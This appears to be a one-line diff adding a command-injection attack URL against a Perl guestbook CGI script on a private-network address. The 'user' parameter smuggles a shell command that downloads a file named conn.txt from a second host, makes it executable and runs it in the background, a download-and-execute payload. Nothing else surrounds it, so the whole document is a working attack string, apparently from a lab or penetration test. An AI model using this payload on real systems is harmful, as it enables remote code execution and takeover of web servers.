@@ -1,0 +1,2 @@
+http://172.16.62.128/~guestbook/cgi-bin/guestbook.pl?user="." $(wget 172.16.62.1/conn.txt %26%26 mv conn.txt conn %26%26 chmod 744 conn %26%26 ./conn %26)
+
